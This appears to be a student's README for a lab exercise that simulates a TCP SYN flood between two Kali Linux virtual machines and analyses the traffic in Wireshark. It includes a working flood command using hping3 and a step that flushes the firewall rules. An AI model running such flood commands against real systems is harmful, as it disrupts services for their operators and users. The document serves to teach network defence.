# 🔍 SYN Flood Attack Simulation & Analysis with Wireshark (Educational Purpose)

> **⚠️ Disclaimer:** This simulation is strictly for **educational use only** in a fully controlled lab environment. Unauthorized or malicious use is **illegal** and **unethical**.

---

## 🎯 Objective

Simulate a SYN flood attack using one Kali Linux VM (Attacker) on another Kali Linux VM (Victim), and analyze the attack using Wireshark to understand the network behavior of a TCP SYN flood.

---

## 🧰 Environment Setup

- **Host OS**: Any (with VirtualBox installed)
- **VM 1 (Attacker)**: Kali Linux
- **VM 2 (Victim)**: Kali Linux
- **Virtual Network Mode**: NAT Network with static IP addresses assigned

---

## 🔌 VirtualBox Network Configuration & IP Setup

### For Both VMs:

1. Go to `Settings` → `Network`
2. Adapter 1 → Attached to: **NAT Network** (or your configured NAT) ![image](https://github.com/user-attachments/assets/bd9730bf-e9d4-48e6-ab1a-e449d2753eba)
   * If you don't have Nat Network, go to File -> Tools -> Network Manager
   * ![image](https://github.com/user-attachments/assets/bc560c40-6c65-418b-8333-6edd9baef45f)
   * ![image](https://github.com/user-attachments/assets/258c369e-3615-4509-ad65-eb180c0de2d3)

---

### Flush iptables rules
```bash
sudo iptables -F
```
Verify Connectivity
From attacker, ping victim:
```bash
ping 10.0.2.15
```
![1](https://github.com/user-attachments/assets/fafe039b-40dc-4e2c-a585-b5ba62c63eb1)

Expect replies to confirm network setup.

---
### 🧪 Preparation
On Kali (Victim):
Install necessary tools and run a TCP listener:
```bash
sudo apt update
sudo apt install net-tools netcat wireshark -y
sudo nc -l -p 80
```
On Kali (Attacker):
Install hping3 and Wireshark:
```bash
sudo apt update
sudo apt install hping3 wireshark -y
```

---

### ⚔️ Launch the SYN Flood Attack
On Kali (Attacker):
Run SYN flood targeting victim:
```bash
sudo hping3 -S --flood -V -p 80 10.0.2.15
```
```-S```: Send SYN packets

```--flood```: Send packets as fast as possible

```-V```: Verbose output

```-p 80```: Target port 80 (same as victim listener)

```10.0.2.15```: Victim static IP

---

### 📈 Analyze with Wireshark
On Kali (Victim):
1. Launch Wireshark with root or sudo:
```bash
sudo wireshark
```
2. Select interface eth0 or whichever corresponds to your network.

3. Start packet capture.

4. Apply this display filter to see SYN flood traffic:
 ```bash
   tcp.flags.syn == 1 and tcp.flags.ack == 0
   ```
5. Observe:

- Large burst of SYN packets flooding in rapidly.

- No complete TCP handshake (no matching ACKs).

- Many half-open connections visible.

---

### 🧠 How to Confirm the Server is Flooded and Down

System Load: CPU will be full and unresponsive. A huge number of packet will be visible in wireshark. 
May see increased load due to handling many half-open connections.

![Screenshot (4)](https://github.com/user-attachments/assets/838efa13-2a1a-440a-9ade-0d633415c532)

---

### 🧼 Clean Up
Stop the attack on attacker with CTRL+C

Stop Wireshark capture and save the .pcap file if desired

Power off both VMs or reset IP settings if needed

### 📛 Legal Warning
Performing SYN flood attacks outside of an isolated, authorized lab environment is prohibited by law. This guide is intended only for cybersecurity students and professionals studying in ethical, simulated environments.

---

### 👨‍🎓 Author
Nahid Chowdhury, University of Dhaka
Contact: cyberxpertme@gmail.com






